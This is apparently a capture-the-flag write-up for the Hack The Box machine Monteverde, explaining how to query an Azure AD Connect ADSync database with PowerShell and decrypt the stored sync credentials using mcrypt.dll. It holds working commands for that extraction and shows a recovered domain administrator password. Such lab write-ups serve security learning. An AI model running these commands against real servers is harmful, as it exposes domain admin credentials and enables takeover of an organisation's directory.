---
title: "Pwning Password Hash Synchronization in Azure Active Directory (Monteverde HTB)"
date: 2020-01-14T15:13:38-05:00
draft: false
description: "Using system.sqlclient to query and decrypt local Administrator PW Hashes"
---

# Password Hash Synchronization

We find ourselves a domain user in the Azure Administrators group. We can use powershell's Invoke-SQLcmd to query the Azure AD Database "ADSync". This database allows active directory to sync the AD configurations to the cloud. The attack is explained more thoroughly in this blog: 

[Azure-AD-Connect=forReadTeams](https://blog.xpnsec.com/azuread-connect-for-redteam/)

The configuration files are stored in:  

mms_server_configuration  

mms_management_agent

The encrypted configuration lies in the mms_management_agent and is decrypted with the entropy, instance_id, and key_id,with the help of mcrypt.dll. 

To query the required fields we can utilize the built-in Powershell commandlet: 
```powershell
Invoke-SQLCMD  
```

```powershell
Invoke-SQLCMD -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "MONTEVERDE" -Database "ADSync"  
  
Invoke-SQLCMD -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent" -ServerInstance "MONTEVERDE" -Database "ADSync"  
```

We can store these values directly in individual powershel variables, and then pass them to the decryption function provided by the XPN blog as such:  
```powershell
add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

Now our decrypted information is stored in $decrypted. So on the command line:

*Evil-WinRM* PS C:\Users\mhope\Documents> $decrypted  

```html
<encrypted-attributes>
 <attribute name="password">d0m@in4dminyeah!</attribute>
</encrypted-attributes>
```






